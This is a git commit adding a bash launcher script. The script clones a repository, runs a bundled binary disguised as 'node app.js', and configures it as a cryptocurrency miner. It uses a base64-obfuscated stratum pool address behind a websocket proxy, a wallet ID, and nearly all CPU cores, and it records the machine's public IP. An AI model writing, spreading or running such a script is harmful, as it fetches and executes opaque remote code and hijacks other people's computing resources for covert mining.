3d12b5ae5d6904b93fe187e8b5cc47efdc62cd23
miltoncarpenter665 <166653213+miltoncarpenter665@users.noreply.github.com>
2025-04-16 00:49:50 +0200

    Create start_shiny_mino_avn.sh

---
+++ start_shiny_mino_avn.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+git clone https://github.com/miltoncarpenter665/node-mino-app.git
+sleep 2
+cd node-mino-app
+sleep 2
+chmod +x node
+
+array=()
+for i in {a..z} {A..Z} {0..9}; 
+   do
+   array[$RANDOM]=$i
+done
+
+currentdate=$(date '+%d-%b-%Y_ShinyWasm_')
+ipaddress=$(curl -s api.ipify.org)
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+used_num_of_cores=`expr $num_of_cores - 4`
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+underscore="_"
+underscored_ip+=$underscore
+currentdate+=$underscored_ip
+
+randomWord=$(printf %s ${array[@]::8} $'\n')
+currentdate+=$randomWord
+
+sleep 2
+
+echo ""
+echo "You will be using $used_num_of_cores cores"
+echo ""
+
+sleep 2
+
+cat > data.json <<END
+{
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/ZXUtc3RyYXR1bS5ibG9ja21pbmVyei5jb206MzUwNQ==",
+  "config": { "threads": $used_num_of_cores, "log": true },
+  "options": { "user": "RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW", "password": "x", "argent": "web-wasm/1.0" }
+}
+END
+sleep 2
+./node app.js
